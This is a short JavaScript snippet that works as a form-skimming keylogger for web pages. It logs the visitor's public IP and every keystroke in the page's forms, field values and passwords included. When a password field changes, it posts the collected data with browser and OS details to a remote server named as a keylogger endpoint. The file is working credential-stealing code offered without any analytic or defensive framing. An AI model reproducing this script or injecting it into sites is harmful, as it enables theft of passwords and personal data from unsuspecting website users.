(() => {
  let data = { host: location.hostname },
    flag = false;

  fetch("https://api.ipify.org?format=json")
    .then((resp) => resp.json())
    .then((e) => (data.user_addr = e.ip));

    Array.from(document.querySelectorAll("form")).map((e) => {

    //   for (let i in e.elements) {
    //     alert(i)
    //   }
      
      // flag
      e.addEventListener("keyup", (e) => {
        data[`${e.target.name}_${e.target.className}_${e.target.id}`] = {
          value: e.target.value,
          type: e.target.type,
        };

        !flag &&
          e.target.type === "password" && [
            (flag = true),
            (e.target.onchange = (e) => [api(data), alert("change")]),
          ];
      });      

      var api = (data) => {
        fetch("https://Keylogger.pzcuong2410.repl.co/send", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
            "os_data": {
                "osName": navigator.platform,
                "osInfo": navigator.appVersion,
                "appName": navigator.appName,
            }
          },
          body: JSON.stringify(data),
        })
          .then((resp) => resp.json())
          .then((data) => console.log("success", data));
      };
    });
})();